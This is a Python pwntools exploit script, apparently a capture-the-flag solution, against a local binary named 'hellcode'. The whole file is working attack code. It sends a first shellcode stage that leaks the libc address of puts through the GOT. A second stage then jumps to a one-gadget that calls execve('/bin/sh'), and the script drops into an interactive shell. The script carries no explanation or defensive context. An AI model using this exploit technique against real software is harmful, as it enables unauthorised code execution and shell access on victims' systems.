from pwn import *

def main():
	p = process("./hellcode")
	#gdb.attach(p)
	context.clear(arch='amd64')
	context.endian = 'little'

	puts_got = 0x4007a0
	
	#leak libc addr
	puts_got = 0x602018
	code_runner = 0x400996
	print p.recvuntil(":")
	
	payload_one = asm("""
		mov r15, %s
		mov r14, [r15]
		push %s
	""" % (puts_got, code_runner))

	print "size %d" % len(payload_one)

 	if (len(payload_one)-16 > 0):
		print "[-] Payload to large"
		exit(0)
	
	payload_one += asm("nop") * (16-len(payload_one))
	p.send(payload_one)
	
	# puts libc addr is now in r14
	
	print p.recvuntil(":")
	
	puts_offset = 0x6F690
	#0xcd0f3
	#execve("/bin/sh", rcx, r12)
	magic = 0xcd0f3

	payload_two = asm("""
		add r14, %s
		xor rcx, rcx
		xor r12, r12
		push r14
	""" % (hex(magic - puts_offset)))

	print "size %d" % len(payload_two)
	if (len(payload_two)-16 > 0):
		print "[-] Payload to large"
		exit(0)
	payload_two += asm("nop") * (16-len(payload_two))	

	p.send(payload_two)
	p.interactive()

if __name__ == "__main__":
	main()
